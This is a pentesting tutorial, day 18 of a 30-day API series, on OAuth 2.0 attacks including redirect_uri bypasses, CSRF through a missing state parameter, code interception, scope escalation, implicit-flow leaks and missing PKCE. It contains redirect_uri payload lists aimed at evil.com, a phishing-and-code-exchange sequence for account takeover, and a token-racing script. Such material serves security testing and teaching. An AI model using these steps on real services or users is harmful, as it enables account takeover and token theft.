# OAuth 2.0 Attacks: Token Theft, Open Redirect & Authorization Bypass

> **Series:** 30-Day API Pentesting | **Day 18** | Week 3: Tools & Techniques  
> **Difficulty:** Beginner → Intermediate  
> **Topic:** OAuth 2.0 Attack Surface Map

---

## What is OAuth 2.0 and Why Is It Attacked?

You see it everywhere — "Login with Google," "Sign in with GitHub," "Continue with Facebook." This is OAuth 2.0 in action. It's a protocol that lets users **grant third-party apps access** to their data without sharing their password.

The problem? OAuth 2.0 is **complex**. It has multiple flows, many parameters, and a lot of things that can go wrong. When a single parameter is misconfigured, the result is often a full **Account Takeover (ATO)** — a Critical-severity bug that pays well on every bug bounty platform.

---

## Part 1: Understanding the OAuth Flow

Before attacking, you need to know what happens during "Login with Google":

```
1. You click "Login with Google" on app.com

2. App redirects you to Google:
   GET https://accounts.google.com/oauth/authorize?
     client_id=APP_CLIENT_ID          ← identifies the app to Google
     &redirect_uri=https://app.com/callback  ← where Google sends the code
     &response_type=code              ← asking for authorization code
     &state=RANDOM_CSRF_TOKEN         ← prevents CSRF attacks
     &scope=email+profile             ← permissions being requested

3. Google shows "app.com wants access to your email and profile"
   → You click Allow

4. Google redirects your browser to:
   https://app.com/callback?code=AUTH_CODE_HERE&state=TOKEN

5. app.com's server exchanges the code with Google:
   POST https://accounts.google.com/oauth/token
     code=AUTH_CODE_HERE
     client_id=APP_CLIENT_ID
     client_secret=APP_SECRET
     redirect_uri=https://app.com/callback

6. Google responds:
   {"access_token": "ya29.XXX", "refresh_token": "...", "expires_in": 3600}

7. app.com uses access_token to get your profile:
   GET https://www.googleapis.com/oauth2/v1/userinfo
   Authorization: Bearer ya29.XXX

8. You're logged in!
```

**Every single step in this flow is an attack surface.**

---

## Attack 1: Open Redirect via redirect_uri

### Why This is Critical

The `redirect_uri` parameter tells the OAuth provider where to send the authorization code after the user approves. If the provider doesn't **strictly validate** this URL, an attacker can redirect the code to their own server — and then use it to log into the victim's account.

**Impact:** The authorization code ends up on the attacker's server. Attacker exchanges it for an access_token. Attacker logs into the victim's account. **Full ATO.**

### Step-by-Step Testing

```bash
# Original OAuth authorization URL:
https://accounts.google.com/oauth/authorize?
  client_id=APP_ID
  &redirect_uri=https://app.target.com/callback   ← legitimate
  &response_type=code
  &state=RANDOM
  &scope=email

# --- ATTACK VARIATIONS TO TEST ---

# Test 1: Direct redirect_uri replacement
https://accounts.google.com/oauth/authorize?
  client_id=APP_ID
  &redirect_uri=https://evil.com        ← direct replacement
  &response_type=code&state=X&scope=email
# If provider accepts this → code sent to evil.com!

# Test 2: Subdomain confusion
  &redirect_uri=https://target.com.evil.com       # provider thinks it's target.com
  &redirect_uri=https://evil.com/target.com       # path confusion
  &redirect_uri=https://target.com@evil.com       # @ trick → evil.com is the host
  &redirect_uri=https://target.com%40evil.com     # URL-encoded @

# Test 3: URL encoding tricks
  &redirect_uri=https://target.com%2fevil.com     # encoded slash
  &redirect_uri=https://target.com%23evil.com     # encoded # — hash fragment
  &redirect_uri=https://target.com%0d%0aevil.com  # CRLF injection

# Test 4: Subdomain of legitimate domain
  &redirect_uri=https://evil.target.com           # if wildcards allowed
  &redirect_uri=https://anything.target.com.evil.com

# Test 5: Path traversal on legitimate domain
  &redirect_uri=https://target.com/callback/../../../redirect?url=https://evil.com
```

### Exploitation After Finding the Vulnerability

```bash
# If redirect_uri=https://evil.com is accepted:

# Step 1: Craft malicious OAuth link
MALICIOUS_LINK="https://accounts.google.com/oauth/authorize?client_id=APP_ID&redirect_uri=https://evil.com&response_type=code&scope=email&state=anything"

# Step 2: Send this link to the victim (phishing, XSS, etc.)
# "Hey, click here to verify your account!"

# Step 3: Victim clicks → approves → their code sent to evil.com
# Your evil.com server logs: GET /?code=4/ABC123DEF456

# Step 4: Exchange the code for an access_token
curl -X POST https://accounts.google.com/oauth/token \
  -d "code=4/ABC123DEF456" \
  -d "client_id=APP_ID" \
  -d "client_secret=APP_SECRET" \
  -d "redirect_uri=https://evil.com" \
  -d "grant_type=authorization_code"
# Response: {"access_token":"ya29.XXX"} → victim's session!

# Step 5: Login to app as victim using the token
```

---

## Attack 2: CSRF via Missing State Parameter

### Why This Works

The `state` parameter is a **random nonce** that prevents Cross-Site Request Forgery. The app sets it before redirecting to the provider, and checks it when the callback returns.

**If state is missing OR not validated**, an attacker can:
1. Start an OAuth flow on their own account
2. Stop before completing it (get the authorization URL)
3. Trick a victim into completing THAT flow
4. The victim's account becomes linked to the attacker's OAuth identity

**Result:** Attacker logs in with their Google account and gets access to the victim's app account.

### Testing for Missing State

```python
import requests
from urllib.parse import urlparse, parse_qs

# Step 1: Initiate OAuth flow normally, intercept the redirect URL
# The URL should look like:
# https://provider.com/oauth/authorize?...&state=RANDOM_VALUE

# Step 2: Check if state is present
auth_url = "https://provider.com/oauth/authorize?client_id=X&redirect_uri=Y&scope=email"
# → Missing state! This is already suspicious

# Step 3: Check if state is validated on callback
# When callback comes: https://app.com/callback?code=X&state=ORIGINAL_STATE
# Try tampering the state:
# https://app.com/callback?code=X&state=WRONG_VALUE
# If this works → state not validated!

# Step 4: Check if state is reused (static instead of random)
# Initiate OAuth twice → if state value is same both times → static = vulnerable
```

### CSRF Attack Execution

```bash
# Attacker's perspective:

# Step 1: Attacker starts OAuth on their ATTACKER account
# Gets authorization URL — does NOT complete the approval

# Step 2: Attacker gets a malicious callback URL
CSRF_URL="https://app.target.com/oauth/callback?code=ATTACKER_CODE&state=ANYTHING"

# Step 3: Trick victim into visiting this URL
# Email: "Click here to verify your email"
# → victim visits CSRF_URL
# → app.target.com processes the code
# → attacker's Google account linked to victim's app account

# Step 4: Attacker logs in with Google (their account)
# → Gets access to victim's app account!
```

---

## Attack 3: Authorization Code Interception

### Multiple Ways the Code Leaks

```bash
# Leak 1: Code in Referer header
# The callback URL: https://app.com/callback?code=SECRET_CODE
# If callback page loads external resources:
# <img src="https://analytics.com/track.gif">
# The request to analytics.com includes:
# Referer: https://app.com/callback?code=SECRET_CODE
# → Code leaked to third party!

# Leak 2: Code in server access logs
# Web server logs store the full URL of every request
# https://app.com/callback?code=SECRET_CODE → logged
# If logs are accessible (LFI, log viewer) → code stolen

# Leak 3: Browser history
# Code appears in browser history
# Shared computer → other users can see it

# Leak 4: Intercepting in Burp (your main test)
# Turn on Burp → click "Login with Google" → approve
# Burp captures: GET /callback?code=SECRET_CODE HTTP/1.1
# → Exchange code yourself before the app does!
```

### Racing the App for the Code

```python
import requests, threading

# When you see the callback in Burp, race the app:
CODE = "4/0AX4XfWh..."  # code from Burp
CLIENT_ID = "app_client_id"
CLIENT_SECRET = "app_client_secret"
REDIRECT_URI = "https://app.target.com/callback"
TOKEN_ENDPOINT = "https://accounts.google.com/oauth/token"

# Exchange the code yourself
resp = requests.post(TOKEN_ENDPOINT, data={
    "code": CODE,
    "client_id": CLIENT_ID,
    "client_secret": CLIENT_SECRET,
    "redirect_uri": REDIRECT_URI,
    "grant_type": "authorization_code"
})

print(resp.json())
# If you win the race: {"access_token": "ya29.XXX", ...}
# → You have the victim's token!
```

---

## Attack 4: Scope Escalation

### What Are Scopes?

Scopes define what permissions the access token grants. For example:
```
scope=email              → can only read email address
scope=email+profile      → can read email + profile
scope=email+profile+repo → can read email, profile, AND GitHub repos
scope=admin              → full admin access
```

### Testing Scope Escalation

```bash
# Original request:
https://github.com/login/oauth/authorize?
  client_id=APP_ID
  &scope=user:email       ← limited scope

# Test 1: Add more scopes
&scope=user:email+repo+admin:org+delete_repo

# Test 2: Try provider-specific admin scopes
&scope=user:email+admin
&scope=read+write+delete
&scope=openid+profile+email+admin
&scope=user:email+repo+gist+admin:org

# Test 3: Scope upgrade after initial auth
# First auth with scope=email → get token
# Then re-auth (without user approval) requesting scope=email+admin
# Does provider grant extra scope without re-asking user?
```

```python
import requests

# Check what scopes the access_token actually has
# For GitHub:
resp = requests.get(
    "https://api.github.com/user",
    headers={"Authorization": f"Bearer ACCESS_TOKEN"}
)
# Check X-OAuth-Scopes response header → shows granted scopes
print(resp.headers.get('X-OAuth-Scopes'))

# For Google:
resp = requests.get(
    "https://www.googleapis.com/oauth2/v1/tokeninfo?access_token=TOKEN"
)
print(resp.json().get('scope'))

# If granted scopes are more than what you requested → scope escalation bug!
```

---

## Attack 5: Token Leakage in Implicit Flow

### The Implicit Flow Problem

The implicit flow (older OAuth 2.0 pattern) puts the **access_token directly in the URL fragment**:

```
https://app.com/callback#access_token=ya29.XXX&token_type=Bearer&expires_in=3600
                         ↑ token is in the URL fragment (after #)
```

Unlike query parameters (`?key=val`), URL fragments are:
- Not sent to the server in request logs
- BUT accessible by JavaScript on the page
- AND appear in the Referer header when navigating to a new page

### Testing Implicit Flow Leaks

```bash
# Step 1: Check if app uses implicit flow
# Look for: response_type=token (instead of response_type=code)
https://provider.com/oauth/authorize?
  response_type=token      ← implicit flow!
  &client_id=APP_ID
  &redirect_uri=https://app.com/callback

# Step 2: After auth, check callback URL
# https://app.com/callback#access_token=TOKEN&expires_in=3600

# Step 3: Check if page loads external resources
# If https://app.com/callback loads:
#   <script src="https://external.com/analytics.js"></script>
# The browser sends:
#   GET /analytics.js HTTP/1.1
#   Referer: https://app.com/callback#access_token=TOKEN
# → Token leaked to analytics.com!

# Step 4: Check postMessage usage
# In browser console at https://app.com:
window.addEventListener('message', (e) => {
    console.log('postMessage received:', e.data, 'from:', e.origin);
});
# If app sends token via postMessage without origin check → any site can steal it
```

---

## Attack 6: No PKCE (Proof Key for Code Exchange)

### What is PKCE?

PKCE is an extension to prevent authorization code interception. Without PKCE:
- Code can be intercepted in transit
- Anyone who gets the code can exchange it

With PKCE:
```
App generates: code_verifier = random_string_128_chars
App hashes it: code_challenge = sha256(code_verifier)
App sends: ?code_challenge=HASH&code_challenge_method=S256
Later: app proves it has code_verifier when exchanging the code
→ Even if code is stolen, attacker can't exchange without code_verifier
```

### Testing for Missing PKCE

```bash
# Check if code_challenge is in the authorization request
# Vulnerable (no PKCE):
https://provider.com/oauth/authorize?
  client_id=X
  &redirect_uri=Y
  &response_type=code
  &scope=email
  # ← no code_challenge parameter!

# Protected (with PKCE):
https://provider.com/oauth/authorize?
  client_id=X
  &redirect_uri=Y
  &response_type=code
  &scope=email
  &code_challenge=E9Melhoa2OwvFrEMTJguCHaoeK1t8URWbuGJSstw-cM
  &code_challenge_method=S256

# If no PKCE → authorization code interception is trivial!
```

---

## Complete OAuth Testing Methodology

```bash
#!/bin/bash
# When you find OAuth on a target, run through this checklist:

echo "=== OAuth Testing Checklist ==="

echo ""
echo "1. REDIRECT_URI TESTING"
echo "   Try: evil.com, target.com.evil.com, target.com@evil.com"
echo "   Try: URL-encoded variations, path traversal, wildcards"

echo ""
echo "2. STATE PARAMETER"
echo "   → Is state present in authorization URL?"
echo "   → Is state random (changes each time)?"
echo "   → Is state validated on callback?"
echo "   → Try sending callback with wrong state"

echo ""
echo "3. CODE INTERCEPTION"
echo "   → Intercept callback in Burp → exchange code manually"
echo "   → Check Referer headers on callback page"
echo "   → Check if PKCE is implemented"

echo ""
echo "4. SCOPE ESCALATION"
echo "   → Add admin/write scopes to authorization request"
echo "   → Check X-OAuth-Scopes header in API responses"
echo "   → Try re-auth with wider scopes"

echo ""
echo "5. IMPLICIT FLOW"
echo "   → Check response_type=token in requests"
echo "   → Check if callback page loads external resources"
echo "   → Check postMessage usage"

echo ""
echo "6. TOKEN REUSE"
echo "   → Does access_token work after logout?"
echo "   → Does refresh_token still work after password change?"
```

---

## Checklist

```
☐  Test redirect_uri → try evil.com, partial matches, subdomain confusion
☐  Check state param → present? random? validated on callback?
☐  Intercept auth code → Burp capture /callback?code= → exchange yourself
☐  Test scope escalation → add admin/write scopes to auth request
☐  Check implicit flow → token in URL? → Referer + browser history leaks
☐  Test PKCE absence → no code_challenge? → code interception trivial
☐  Logout and replay token → still valid? → no revocation
☐  Read X-OAuth-Scopes header → more than requested? → scope escalation
```

---

*Written by @anand87794*  
*30-Day API Pentesting Series — Day 18 of 30*
